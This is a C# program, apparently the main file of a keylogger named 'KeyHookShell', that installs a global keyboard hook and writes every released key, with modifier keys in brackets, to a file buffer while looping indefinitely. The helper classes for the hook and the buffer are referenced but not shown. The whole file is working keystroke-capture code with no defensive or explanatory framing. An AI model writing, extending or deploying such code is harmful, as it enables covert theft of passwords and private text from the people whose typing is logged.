using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;

namespace KeyHookShell
{
    class Program
    {

        private static GlobalKeyboardHook gkh = new GlobalKeyboardHook();
        private static BufferManager bufferManager = new BufferManager();
        
        private static void gkh_KeyUp(object sender, KeyEventArgs e)
        {

            //if (GlobalKeyboardHook.IsModifier((int)e.KeyCode))
            //    txtKeys.Text += "[" + e.KeyCode.ToString() + "]";
            //else
            //    txtKeys.Text += e.KeyCode.ToString();

            FileBuffer buffer = FileBuffer.GetInstance();
            if (GlobalKeyboardHook.IsModifier((int)e.KeyCode))
                buffer.Write( "[" + e.KeyCode.ToString() + "]");
            else
                buffer.Write(e.KeyCode.ToString());
            //e.Handled = true;
        }

        private static void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            //Do something
            //e.Handled = true;
        }

        static void Main(string[] args)
        {
            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
            gkh.KeyUp += new KeyEventHandler(gkh_KeyUp);
            bufferManager.Start();

            while (true)
            {
                Thread.Sleep(2000);
            }

            //gkh.KeyDown -= new KeyEventHandler(gkh_KeyDown);
            //gkh.KeyUp -= new KeyEventHandler(gkh_KeyUp);
            //bufferManager.Stop();
        }
    }
}
